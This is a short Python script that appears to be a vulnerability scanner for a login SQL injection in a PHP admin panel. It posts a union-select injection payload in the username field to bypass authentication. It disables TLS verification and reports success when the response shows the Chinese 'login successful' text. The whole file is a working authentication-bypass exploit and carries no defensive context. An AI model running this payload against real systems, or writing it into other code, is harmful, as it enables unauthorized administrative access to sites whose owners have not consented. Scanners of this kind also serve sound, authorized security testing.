import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"index.php?s=/admin/public/login.html"
	body="username[0]=exp&username[1]=)) union select 1,2,'',4,5,6,7,8,9,10,1--+-&password="
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	# response.encoding='utf-8'
	if response.status_code == 200 and "恭喜您" in response.text and "登录成功" in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
